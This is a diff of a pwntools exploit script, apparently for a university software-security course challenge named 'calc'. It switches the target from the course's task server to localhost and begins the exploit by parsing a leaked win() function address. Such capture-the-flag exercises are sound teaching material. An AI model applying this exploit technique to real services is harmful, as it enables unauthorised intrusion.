@@ -12,8 +12,8 @@ pwn.context.arch = 'amd64'
 # 1) docker compose -f debug.yml up
 # 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/calc')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'
 
-conn = pwn.remote('tasks.ws24.softsec.rub.de', 32988)
-#conn = pwn.remote('127.0.0.1', 1024)
+#conn = pwn.remote('tasks.ws24.softsec.rub.de', 32988)
+conn = pwn.remote('127.0.0.1', 1024)
 
 # 1) leak win() address
 address_win = int(conn.recvline()[-13:-1],16)
